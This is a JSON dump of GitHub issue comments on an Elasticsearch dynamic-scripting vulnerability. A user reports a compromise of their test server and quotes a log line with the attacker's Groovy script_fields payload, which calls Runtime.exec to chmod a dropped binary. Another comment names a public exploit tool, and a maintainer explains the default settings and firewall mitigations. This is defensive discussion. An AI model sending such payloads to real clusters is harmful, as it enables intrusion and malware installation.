[{"url":"https://api.github.com/repos/elastic/elasticsearch/issues/comments/86047456","html_url":"https://github.com/elastic/elasticsearch/issues/9655#issuecomment-86047456","issue_url":"https://api.github.com/repos/elastic/elasticsearch/issues/9655","id":86047456,"node_id":"MDEyOklzc3VlQ29tbWVudDg2MDQ3NDU2","user":{"login":"bjm88","id":3016277,"node_id":"MDQ6VXNlcjMwMTYyNzc=","avatar_url":"https://avatars3.githubusercontent.com/u/3016277?v=4","gravatar_id":"","url":"https://api.github.com/users/bjm88","html_url":"https://github.com/bjm88","followers_url":"https://api.github.com/users/bjm88/followers","following_url":"https://api.github.com/users/bjm88/following{/other_user}","gists_url":"https://api.github.com/users/bjm88/gists{/gist_id}","starred_url":"https://api.github.com/users/bjm88/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/bjm88/subscriptions","organizations_url":"https://api.github.com/users/bjm88/orgs","repos_url":"https://api.github.com/users/bjm88/repos","events_url":"https://api.github.com/users/bjm88/events{/privacy}","received_events_url":"https://api.github.com/users/bjm88/received_events","type":"User","site_admin":false},"created_at":"2015-03-25T14:20:32Z","updated_at":"2015-03-25T14:20:32Z","author_association":"NONE","body":"We had this security issue exploited against our UAT/test AWS instance.  Production ES cluster is behind firewall, but UAT/test env was not.  I suspect a scanning of port 9200 for ES is how we were identified.  In elastic search logs we saw the below, you see the use groovy script to get java Runtime and do exec.  In our case they put a udp bot in our /tmp folder likely to launch udp port 80 DOS attacks.\n\norg.elasticsearch.search.SearchParseException: [caredox_demo_medications][4]: from[-1],size[1]: Parse Failure [Failed to parse source [{\"size\":1,\"script_fields\":{\"exp\":{\"script\":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"chmod 777 /tmp/bvxz.fp\\\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}]]\n","performed_via_github_app":null},{"url":"https://api.github.com/repos/elastic/elasticsearch/issues/comments/143699182","html_url":"https://github.com/elastic/elasticsearch/issues/9655#issuecomment-143699182","issue_url":"https://api.github.com/repos/elastic/elasticsearch/issues/9655","id":143699182,"node_id":"MDEyOklzc3VlQ29tbWVudDE0MzY5OTE4Mg==","user":{"login":"jiamo","id":732751,"node_id":"MDQ6VXNlcjczMjc1MQ==","avatar_url":"https://avatars3.githubusercontent.com/u/732751?v=4","gravatar_id":"","url":"https://api.github.com/users/jiamo","html_url":"https://github.com/jiamo","followers_url":"https://api.github.com/users/jiamo/followers","following_url":"https://api.github.com/users/jiamo/following{/other_user}","gists_url":"https://api.github.com/users/jiamo/gists{/gist_id}","starred_url":"https://api.github.com/users/jiamo/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/jiamo/subscriptions","organizations_url":"https://api.github.com/users/jiamo/orgs","repos_url":"https://api.github.com/users/jiamo/repos","events_url":"https://api.github.com/users/jiamo/events{/privacy}","received_events_url":"https://api.github.com/users/jiamo/received_events","type":"User","site_admin":false},"created_at":"2015-09-28T10:05:42Z","updated_at":"2015-09-28T10:05:42Z","author_association":"NONE","body":"elasticsearch-1.7.2  set  `script.disable_dynamic: false`. The tool from https://github.com/Svti/ElasticSearchEXP still can success exec command.\n","performed_via_github_app":null},{"url":"https://api.github.com/repos/elastic/elasticsearch/issues/comments/143700112","html_url":"https://github.com/elastic/elasticsearch/issues/9655#issuecomment-143700112","issue_url":"https://api.github.com/repos/elastic/elasticsearch/issues/9655","id":143700112,"node_id":"MDEyOklzc3VlQ29tbWVudDE0MzcwMDExMg==","user":{"login":"dakrone","id":19060,"node_id":"MDQ6VXNlcjE5MDYw","avatar_url":"https://avatars3.githubusercontent.com/u/19060?v=4","gravatar_id":"","url":"https://api.github.com/users/dakrone","html_url":"https://github.com/dakrone","followers_url":"https://api.github.com/users/dakrone/followers","following_url":"https://api.github.com/users/dakrone/following{/other_user}","gists_url":"https://api.github.com/users/dakrone/gists{/gist_id}","starred_url":"https://api.github.com/users/dakrone/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/dakrone/subscriptions","organizations_url":"https://api.github.com/users/dakrone/orgs","repos_url":"https://api.github.com/users/dakrone/repos","events_url":"https://api.github.com/users/dakrone/events{/privacy}","received_events_url":"https://api.github.com/users/dakrone/received_events","type":"User","site_admin":false},"created_at":"2015-09-28T10:11:26Z","updated_at":"2015-09-28T10:11:26Z","author_association":"MEMBER","body":"> elasticsearch-1.7.2 set `script.disable_dynamic: false`. The tool from\n> https://github.com/Svti/ElasticSearchEXP still can success exec\n> command.\n\nThis is if you enable dynamic scripting (which is off by default). If\nyou enable dynamic scripting you will need to protect Elasticsearch by\nother means (binding to localhost only, or using a firewall).\n","performed_via_github_app":null},{"url":"https://api.github.com/repos/elastic/elasticsearch/issues/comments/143711676","html_url":"https://github.com/elastic/elasticsearch/issues/9655#issuecomment-143711676","issue_url":"https://api.github.com/repos/elastic/elasticsearch/issues/9655","id":143711676,"node_id":"MDEyOklzc3VlQ29tbWVudDE0MzcxMTY3Ng==","user":{"login":"jiamo","id":732751,"node_id":"MDQ6VXNlcjczMjc1MQ==","avatar_url":"https://avatars3.githubusercontent.com/u/732751?v=4","gravatar_id":"","url":"https://api.github.com/users/jiamo","html_url":"https://github.com/jiamo","followers_url":"https://api.github.com/users/jiamo/followers","following_url":"https://api.github.com/users/jiamo/following{/other_user}","gists_url":"https://api.github.com/users/jiamo/gists{/gist_id}","starred_url":"https://api.github.com/users/jiamo/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/jiamo/subscriptions","organizations_url":"https://api.github.com/users/jiamo/orgs","repos_url":"https://api.github.com/users/jiamo/repos","events_url":"https://api.github.com/users/jiamo/events{/privacy}","received_events_url":"https://api.github.com/users/jiamo/received_events","type":"User","site_admin":false},"created_at":"2015-09-28T10:58:38Z","updated_at":"2015-09-28T10:58:38Z","author_association":"NONE","body":"Can elastisseach scripts only identify like `\"script\" : \"ctx._source.counter += count\",` and disable script in the https://github.com/Svti/ElasticSearchEXP ?\n","performed_via_github_app":null}]